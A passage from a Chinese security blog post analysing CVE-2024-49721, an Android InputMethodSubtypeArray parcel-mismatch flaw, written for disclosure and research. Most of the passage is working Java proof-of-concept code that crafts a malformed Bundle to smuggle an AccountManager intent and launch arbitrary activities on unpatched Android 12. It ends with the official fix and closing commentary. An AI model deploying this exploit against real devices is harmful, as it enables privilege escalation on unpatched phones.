class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Bundle <span class="title">makeBundle</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        Parcel parcel = Parcel.obtain();</span><br><span class="line">        parcel.writeInt(<span class="number">0</span>); <span class="comment">// bundle size</span></span><br><span class="line">        parcel.writeInt(<span class="number">0x4C444E44</span>); <span class="comment">// BUNDLE_MAGIC_NATIVE, 'B' 'N' 'D' 'N'</span></span><br><span class="line">        parcel.writeInt(<span class="number">3</span>); <span class="comment">// bundle key-value pair count</span></span><br><span class="line">        parcel.writeString(<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span>); <span class="comment">// key of first kv pair, mismatch object is here</span></span><br><span class="line">        parcel.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PARCELABLE</span></span><br><span class="line">        writeMismatchObject(parcel); <span class="comment">// value</span></span><br><span class="line">        <span class="comment">// remaining 24 bytes, write second kv pair</span></span><br><span class="line">        parcel.writeString(createStringPayload(intent)); <span class="comment">// first interpreted as key</span></span><br><span class="line">        parcel.writeInt(-<span class="number">1</span>); <span class="comment">// VAL_NULL</span></span><br><span class="line">        parcel.writeString(<span class="string">"zzzzzzzzzzzz"</span>); <span class="comment">// last key</span></span><br><span class="line">        parcel.writeInt(-<span class="number">1</span>); <span class="comment">// VAL_NULL</span></span><br><span class="line">        parcel.setDataPosition(<span class="number">0</span>);</span><br><span class="line">        parcel.writeInt(parcel.dataSize() - <span class="number">12</span>); <span class="comment">// reset bundle size</span></span><br><span class="line">        parcel.setDataPosition(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">        bundle.readFromParcel(parcel);</span><br><span class="line">        parcel.recycle();</span><br><span class="line">        <span class="keyword">return</span> bundle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">createStringPayload</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        Parcel parcel = Parcel.obtain();</span><br><span class="line">        <span class="comment">// -24</span></span><br><span class="line">        parcel.writeInt(<span class="number">0</span>); <span class="comment">// string length</span></span><br><span class="line">        <span class="comment">// -20</span></span><br><span class="line">        parcel.writeInt(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// -16</span></span><br><span class="line">        parcel.writeInt(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// -12</span></span><br><span class="line">        parcel.writeInt(<span class="number">3</span>);</span><br><span class="line">        <span class="comment">// -8</span></span><br><span class="line">        parcel.writeInt(<span class="number">4</span>);</span><br><span class="line">        <span class="comment">// -4</span></span><br><span class="line">        parcel.writeInt(<span class="number">0</span>); <span class="comment">// string null terminator</span></span><br><span class="line">        parcel.writeInt(-<span class="number">1</span>); <span class="comment">// VAL_NULL</span></span><br><span class="line">        <span class="comment">// New Key-Value Pair appears!</span></span><br><span class="line">        parcel.writeString(AccountManager.KEY_INTENT); <span class="comment">// key</span></span><br><span class="line">        parcel.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PARCELABLE</span></span><br><span class="line">        parcel.writeParcelable(intent, <span class="number">0</span>); <span class="comment">// value</span></span><br><span class="line">        parcel.writeInt(<span class="number">0</span>); <span class="comment">// string null terminator</span></span><br><span class="line">        parcel.setDataPosition(<span class="number">0</span>);</span><br><span class="line">        parcel.writeInt((parcel.dataSize() - <span class="number">8</span>) / <span class="number">2</span>);</span><br><span class="line">        parcel.setDataPosition(<span class="number">0</span>); </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> parcel.readString();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            parcel.recycle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writeMismatchObject</span><span class="params">(Parcel parcel)</span> </span>&#123;</span><br><span class="line">        parcel.writeString(InputMethodInfo.class.getName());</span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            InputMethodInfo inputMethodInfo = new InputMethodInfo("aaa", "bbb", "ccc", "ddd");</span></span><br><span class="line"><span class="comment">//            Field mSubtypes = InputMethodInfo.class.getDeclaredField("mSubtypes");</span></span><br><span class="line"><span class="comment">//            mSubtypes.setAccessible(true);</span></span><br><span class="line"><span class="comment">//            Object subtypes = mSubtypes.get(inputMethodInfo);</span></span><br><span class="line"><span class="comment">//            Class&lt;?&gt; cls = Class.forName("android.view.inputmethod.InputMethodSubtypeArray");</span></span><br><span class="line"><span class="comment">//            Field mCount = cls.getDeclaredField("mCount");</span></span><br><span class="line"><span class="comment">//            mCount.setAccessible(true);</span></span><br><span class="line"><span class="comment">//            mCount.set(subtypes, -1);</span></span><br><span class="line"><span class="comment">//            parcel.writeParcelable(inputMethodInfo, 0);</span></span><br><span class="line"><span class="comment">//        &#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="comment">//            throw new RuntimeException(e);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        parcel.writeString(<span class="keyword">null</span>); <span class="comment">// mId</span></span><br><span class="line">        parcel.writeString(<span class="keyword">null</span>); <span class="comment">// mSettingsActivityName</span></span><br><span class="line">        parcel.writeInt(<span class="number">0</span>); <span class="comment">// mIsDefaultResId</span></span><br><span class="line">        parcel.writeInt(<span class="number">0</span>); <span class="comment">// mIsAuxIme</span></span><br><span class="line">        parcel.writeInt(<span class="number">0</span>); <span class="comment">// mSupportsSwitchingToNextInputMethod</span></span><br><span class="line">        parcel.writeInt(<span class="number">0</span>); <span class="comment">// mInlineSuggestionsEnabled</span></span><br><span class="line">        parcel.writeInt(<span class="number">0</span>); <span class="comment">// mSupportsInlineSuggestionsWithTouchExploration</span></span><br><span class="line">        parcel.writeBoolean(<span class="keyword">false</span>); <span class="comment">// mSuppressesSpellChecker</span></span><br><span class="line">        parcel.writeBoolean(<span class="keyword">false</span>); <span class="comment">// mShowInInputMethodPicker</span></span><br><span class="line">        parcel.writeBoolean(<span class="keyword">false</span>); <span class="comment">// mIsVrOnly;</span></span><br><span class="line">        parcel.writeBoolean(<span class="keyword">false</span>); <span class="comment">// mIsVirtualDeviceOnly</span></span><br><span class="line">        <span class="keyword">new</span> ResolveInfo().writeToParcel(parcel, <span class="number">0</span>); <span class="comment">// mService</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        mSubtypes.writeToParcel(dest);</span></span><br><span class="line">        parcel.writeInt(-<span class="number">1</span>); <span class="comment">// mSubtypes.mCount</span></span><br><span class="line"></span><br><span class="line">        parcel.writeInt(<span class="number">0</span>); <span class="comment">// mHandledConfigChanges</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我这里用 <code>BUNDLE_MAGIC_NATIVE</code> 纯粹是我个人喜欢用，不过看其他人似乎都不喜欢用这个，用 <code>BUNDLE_MAGIC</code> 应该也能触发。随便打了几个字符串是为了凑 hash，虽然不太好看但是 it works<br>模拟系统读入 bundle 然后转发 bundle 的测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Parcel parcel = Parcel.obtain();</span><br><span class="line">Intent intent = <span class="keyword">new</span> Intent().setClassName(<span class="string">"android"</span>, <span class="string">"com.android.internal.app.PlatLogoActivity"</span>);</span><br><span class="line">Bundle bundle = makeBundle(intent);</span><br><span class="line"><span class="comment">// simulate AccountManagerService read</span></span><br><span class="line">parcel.setDataPosition(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// Authenticator app -&gt; AccountManagerService</span></span><br><span class="line">parcel.writeBundle(bundle);</span><br><span class="line">parcel.setDataPosition(<span class="number">0</span>);</span><br><span class="line">Bundle b1 = parcel.readBundle();</span><br><span class="line">Log.e(<span class="string">"PoC"</span>, <span class="string">"intent in init bundle: "</span> + bundle.getParcelable(AccountManager.KEY_INTENT));</span><br><span class="line">Log.e(<span class="string">"PoC"</span>, <span class="string">"first deserialization: "</span> + b1.getParcelable(AccountManager.KEY_INTENT));</span><br><span class="line">parcel.setDataPosition(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// AccountManagerService -&gt; caller</span></span><br><span class="line">parcel.writeBundle(b1);</span><br><span class="line">parcel.setDataPosition(<span class="number">0</span>);</span><br><span class="line">Bundle b2 = parcel.readBundle();</span><br><span class="line">Log.e(<span class="string">"PoC"</span>, <span class="string">"second deserialization: "</span> + b2.getParcelable(AccountManager.KEY_INTENT)</span><br></pre></td></tr></table></figure><p>运行测试代码可以发现，第一次读 intent 的时候返回 null，第二次恶意 intent 出现。<br>在未打补丁且没有 <code>checkKeyIntentParceledCorrectly</code> 的 Android 12 系统上，把构造好的 bundle 返回给 <code>AccountManagerService</code>，<code>PlatLogoActivity</code> 直接被成功拉起。至于它在有 <code>checkKeyIntentParceledCorrectly</code> 的系统上有什么作用，能造成什么危害，就留给读者自己去思考。</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul><li><a href="https://source.android.com/docs/security/bulletin/2025-02-01" target="_blank" rel="noopener">2025 年 2 月 Android 安全公告</a> 对该漏洞发布了一个补丁 <a href="https://android.googlesource.com/platform/frameworks/base/+/7714ccb85ed961083dcc97e230c71242c3422b5e" target="_blank" rel="noopener">InputMethodSubtypeArray: prevent negative count injection</a>，<code>mCount &lt; 0</code> 的情况会直接抛出异常中断反序列化流程。这个补丁被移植到了 Android 12、12L、13 （14 已经包含该修复），Android 11 或更低版本已经 EOL。</li><li>AccountManagerService 整个流程可能会引入新的保护：<a href="https://android.googlesource.com/platform/frameworks/base/+/09d381088952db904dbd0cc1c1c7362c033cf216" target="_blank" rel="noopener">Sanitize Bundle from AbstractAccountAuthenticator</a>，app 返回的 bundle 中的内容会被拷贝到一个新的 bundle 中，且只有在白名单的 key 和 value 会被保留，而允许的 Parcelable 类型仅有 <code>AccountManager.KEY_INTENT</code> 一项，阻止了 bundle 内含有任意 Parcelable 类型进而 mismatch。需要注意的是该提交目前是<a href="https://android.googlesource.com/platform/frameworks/base/+/5af7ec8fbeb52666d70873b62adbddb696716578" target="_blank" rel="noopener">已经被回滚</a>的状态所以并未生效，但描述中表示 <code>A new version will be created.</code>，所以可以预计将会在未来版本中上线。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞的历史非常久远，2014 年 3 月 6 日引入此类的第一个提交 <a href="https://cs.android.com/android/_/android/platform/frameworks/base/+/f06569561fe1c6e898debf8bb9f37331a9f87323" target="_blank" rel="noopener">Introduce InputMethodSubtypeArray for memory efficient IPCs</a> 就已经存在此漏洞，可能是 Android 史上生存时间最长的 parcel mismatch 漏洞。而由于其直接存在于 AOSP 而非 OEM 代码内，影响范围可谓是极大。<br>挖掘此类漏洞的人千千万，这个类存在的判断差异也非常明显，为什么各种扫描器都没扫出来这个洞？我觉得可能是因为这个类并没有直接实现 Parcelable 导致大部分扫描器一开始就直接把它忽略了，即使有爆出警告，由于逻辑较为复杂，很可能在后续的人工 review 过程里被认为是误报而忽略。<br>除了 Google 给出的修复方法，另一种思路是把序列化流程里的 <code>if (mCount == 0)</code> 改成 <code>if (mCount &lt;= 0)</code>，让负数 count 也只写一个 int 进去即可。可惜这种方法并没有被采用，要不然此漏洞跟上一次被大规模利用的同类漏洞 CVE-2023-20963 就可以一起被称为“少打一个运算符的代价”了（<br>那么，此漏洞终结之后，我们有了一个新的疑问：自 2014 年，Android 系统开发人员、供应链开发者及各设备厂商程序员就不断与此类反序列化漏洞作斗争，漏洞不断被写出来又不断被发现和修复，直到 2025 年的今天，开发人员也时常因为各种疏漏而写出<a href="https://android.googlesource.com/platform/frameworks/base/+/2ce74e2d84777657f11b5cbabc501e6d79c86337" target="_blank" rel="noopener">类似 bug</a>。那么，这个漏洞，会是最后一个 Parcel Mismatch 漏洞吗？我们拭目以待。</p><br><section class="widget copyright desktop mobile"><div class="content"><blockquote><p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p><p>本文永久链接是：<a href="https://blog.canyie.top/2025/02/04/CVE-2024-49721/">https://blog.canyie.top/2025/02/04/CVE-2024-49721/</a></p></blockquote></div></section></div><section class="meta" id="footer-meta"><div class="new-meta-box"><div class="new-meta-item date" itemprop="dateUpdated" datetime="2025-04-24T18:33:02+08:00"><a class="notlink"><i class="fas fa-edit fa-fw" aria-hidden="true"></i><p>更新于2025年4月24日</p></a></div><div class="new-meta-item meta-tags"><a class="tag" href="/tags/android/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>android</p></a></div><div class="new-meta-item meta-tags"><a class="tag" href="/tags/system/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>system</p></a></div><div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%AE%89%E5%85%A8/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>安全</p></a></div><div class="new-meta-item meta-tags"><a class="tag" href="/tags/parcel/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>parcel</p></a></div><div class="new-meta-item share -mob-share-list"><div class="-mob-share-list share-body"><a class="-mob-share-qq" rel="external nofollow noopener noreferrer noopener" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.canyie.top/2025/02/04/CVE-2024-49721/&title=CVE-2024-49721 InputMethodSubtypeArray 反序列化漏洞分析 - 残页的小博客&summary=神马，都 2025 年啦，还有 Parcel Mismatch 漏洞？！？对！你没听错！最经典最被广泛利用的 Parcel Mismatch 漏洞，它又双叒叕来了！怕了吗？！？去年我和 Cxxsheng 对整个 Parcelable IPC 机制进行了一些研究，并开发了一个扫描器用以扫描相关漏洞。此漏洞就是我们研究过程中发现的漏洞之一。我们于 2024 年 12 月 3 日提交漏洞报告，后被告知与另一份漏洞报告重复。以下记录了我们当时的分析。部分敏感信息已被移除或脱敏以保证安全。" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qq.png"> </a><a class="-mob-share-qzone" rel="external nofollow noopener noreferrer noopener" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://blog.canyie.top/2025/02/04/CVE-2024-49721/&title=CVE-2024-49721 InputMethodSubtypeArray 反序列化漏洞分析 - 残页的小博客&summary=神马，都 2025 年啦，还有 Parcel Mismatch 漏洞？！？对！你没听错！最经典最被广泛利用的 Parcel Mismatch 漏洞，它又双叒叕来了！怕了吗？！？去年我和 Cxxsheng 对整个 Parcelable IPC 机制进行了一些研究，并开发了一个扫描器用以扫描相关漏洞。此漏洞就是我们研究过程中发现的漏洞之一。我们于 2024 年 12 月 3 日提交漏洞报告，后被告知与另一份漏洞报告重复。以下记录了我们当时的分析。部分敏感信息已被移除或脱敏以保证安全。" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qzone.png"> </a><a class="-mob-share-weibo" rel="external nofollow noopener noreferrer noopener" href="http://service.weibo.com/share/share.php?url=https://blog.canyie.top/2025/02/04/CVE-2024-49721/&title=CVE-2024-49721 InputMethodSubtypeArray 反序列化漏洞分析 - 残页的小博客&summary=神马，都 2025 年啦，还有 Parcel Mismatch 漏洞？！？对！你没听错！最经典最被广泛利用的 Parcel Mismatch 漏洞，它又双叒叕来了！怕了吗？！？去年我和 Cxxsheng 对整个 Parcelable IPC 机制进行了一些研究，并开发了一个扫描器用以扫描相关漏洞。此漏洞就是我们研究过程中发现的漏洞之一。我们于 2024 年 12 月 3 日提交漏洞报告，后被告知与另一份漏洞报告重复。以下记录了我们当时的分析。部分敏感信息已被移除或脱敏以保证安全。" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/weibo.png"></a></div></div></div></section><div class="prev-next"><a class="prev" href="/2025/08/24/android-runtime-resources-overlay-sequence/"><p class="title"><i class="fas fa-chevron-left" aria-hidden="true"></i>Android Runtime Resources Overlay 